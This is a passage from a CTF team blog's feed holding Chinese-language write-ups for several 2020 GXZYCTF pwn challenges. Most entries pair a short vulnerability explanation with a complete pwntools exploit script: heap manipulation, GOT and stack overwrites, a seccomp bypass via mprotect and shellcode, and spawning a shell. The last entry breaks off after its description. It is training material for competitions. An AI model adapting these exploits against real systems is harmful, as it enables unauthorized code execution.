class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">58</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./easyheap'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"How long is this message?"</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> size &lt; <span class="number">0x400</span>:</span><br><span class="line">        sf(<span class="string">"What is the content of the message?"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"What is the index of the item to be deleted?"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"What is the index of the item to be modified?"</span>,str(idx))</span><br><span class="line">    sf(<span class="string">"What is the content of the message?"</span>,content)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"123"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x401</span>,<span class="string">"aa"</span>)</span><br><span class="line">    add(<span class="number">0x401</span>,<span class="string">"aa"</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"\x20"</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0602018</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x400670</span>))</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">"\n"</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]) - <span class="number">0x3c4c20</span></span><br><span class="line">    ShowAddress(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0602050</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">2</span>,p64(libc_addr + <span class="number">0x45390</span>))</span><br><span class="line">    #dele(<span class="number">1</span>)</span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_logic" scheme="https://boiteam.github.io/tags/Pwn-logic/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF lgd</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_lgd/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_lgd/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:03:32.937Z</updated>
    
    <content type="html"><![CDATA[<p>有沙盒功能，使用seccomp-tools dump ./pwn<br>之后利用栈上EIP，构造读取文件的ROP，或者改变页权限，写读取文件flag。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">09</span>:<span class="number">36</span>:<span class="number">57</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    slf(<span class="string">"\n"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line">    sf(<span class="string">"___c___r__s__++___c___new_content ?"</span>,content)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    slf(<span class="string">"\n"</span>,<span class="string">"sofr_is_cool"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">"n"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">"n"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]) - <span class="number">0x3c4c08</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">0x100</span>)#<span class="number">1</span></span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>)+p64(libc_addr+<span class="number">0x3c4b50</span>)+<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(<span class="number">0x81</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">2</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">4</span></span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6032e0</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">0x60</span>)#<span class="number">5</span></span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0x00000000006032f0</span>)+p64(libc_addr+<span class="number">0x3c67a8</span>)+p64(<span class="number">0x6033c0</span>))</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0x55800</span>+libc_addr))</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">"%6$p|"</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    stack_addr = int(ru(<span class="string">"|"</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.linux.cat(<span class="string">'./flag'</span>)</span><br><span class="line">    #shellcode = shellcraft.amd64.pushstr(<span class="string">"./flag"</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.open(<span class="string">'rsp'</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.read(<span class="string">'rax'</span>,<span class="string">'rsp'</span>,<span class="number">0</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line">    print len(shellcode)</span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x00000000006032f0</span>)+p64(libc_addr+<span class="number">0x3c67a8</span>)+p64(stack_addr+<span class="number">0x48</span>)+p64(<span class="number">0x603260</span>)+p64(libc_addr+libc.symbols[<span class="string">'mprotect'</span>])+shellcode)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0x0000040000000400</span>)*<span class="number">10</span>)</span><br><span class="line">    debug()</span><br><span class="line">    file_p = <span class="number">0x603360</span></span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0x4023AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x603310</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0x00603000</span>)+p64(<span class="number">0x402390</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x603318</span>))</span><br><span class="line">    #dele(<span class="number">1</span>)</span><br><span class="line">    #dele(<span class="number">0</span>)</span><br><span class="line">    ShowAddress(<span class="string">"libc_addr"</span>,libc_addr)</span><br><span class="line">    ShowAddress(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有沙盒功能，使用seccomp-tools dump ./pwn&lt;br&gt;之后利用栈上EIP，构造读取文件的ROP，或者改变页权限，写读取文件flag。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_seccomp" scheme="https://boiteam.github.io/tags/Pwn-seccomp/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF musl</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_musl/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_musl/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:04:15.458Z</updated>
    
    <content type="html"><![CDATA[<p>自定的libc，早期unlink，不存在malloc_hook和free_hook，最后覆盖栈上的EIP进行利用。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Tue Mar <span class="number">10</span> <span class="number">13</span>:<span class="number">10</span>:<span class="number">01</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./carbon'</span></span><br><span class="line">libc_name = <span class="string">'./libc.so'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">#bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content,flag=<span class="string">"N"</span>):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"What is your prefer size? &gt;"</span>,str(size))</span><br><span class="line">    slf(<span class="string">"Are you a believer? &gt;"</span>,flag)</span><br><span class="line">    slf(<span class="string">"Say hello to your new sleeve &gt;"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"What is your sleeve ID? &gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"What is your sleeve ID? &gt;"</span>,str(idx))</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    slf(<span class="string">"What is your sleeve ID? &gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"sofr_is_"</span>)</span><br><span class="line">    add(<span class="number">0x8</span>,<span class="string">"sofrcool"</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">"sofrcool"</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">"\x7f"</span>)) - <span class="number">0x292e38</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"2"</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"3"</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"4"</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"4"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">6</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x40</span>)+p64(<span class="number">0x290038</span>+libc_addr)*<span class="number">2</span>,<span class="string">"Y"</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"sofr"</span>)</span><br><span class="line">    edit(<span class="number">4</span>,p64(libc_addr + <span class="number">0x290008</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x602034</span>)+p64(<span class="number">0x10</span>)+p64(libc_addr + <span class="number">0x294fd8</span>)+p64(<span class="number">0x80</span>))</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">"\x00"</span>)</span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    stack_addr = l64_addr(ru(<span class="string">"\x7f"</span>))</span><br><span class="line">    eip_addr = stack_addr - <span class="number">0x70</span></span><br><span class="line">    rop_addr = <span class="number">0x0000000000014862</span> + libc_addr</span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x80</span>)+p64(eip_addr))</span><br><span class="line">    debug()</span><br><span class="line">    edit(<span class="number">1</span>,p64(rop_addr)+p64(<span class="number">0x290008</span>+libc_addr)+p64(<span class="number">0x42688</span>+libc_addr))</span><br><span class="line">    ShowAddress(<span class="string">"haha"</span>,libc_addr+<span class="number">0x290000</span>)</span><br><span class="line">    ShowAddress(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">    ShowAddress(<span class="string">"stack"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自定的libc，早期unlink，不存在malloc_hook和free_hook，最后覆盖栈上的EIP进行利用。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_unlink" scheme="https://boiteam.github.io/tags/Pwn-unlink/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF shotest_path</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_shotest_path/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_shotest_path/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:04:23.943Z</updated>
    
    <content type="html"><![CDATA[<p>最短路径算法的题目，</p><p>应该是实现了Bellman_Ford算法，在Query a route功能查找最短路径时，当变量v5=200时，.BSS段上的NextJump数组溢出到Inuse数组的第一个，即&amp;NextJump[200]=&amp;Inuse[0]，往Inuse[0]写一个地址，可改变第一个Station的inuse状态。<br>当存在负值的环时，会一直执行for循环，直到遍历某个节点的次数大于总节点数时，即n*(n-1)次，当负值环的节点个数n&gt;=15时，可以达到遍历200次以上，从而触发上述漏洞。提前伪造好ptr[0]使其name_ptr指向flag地址即可。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 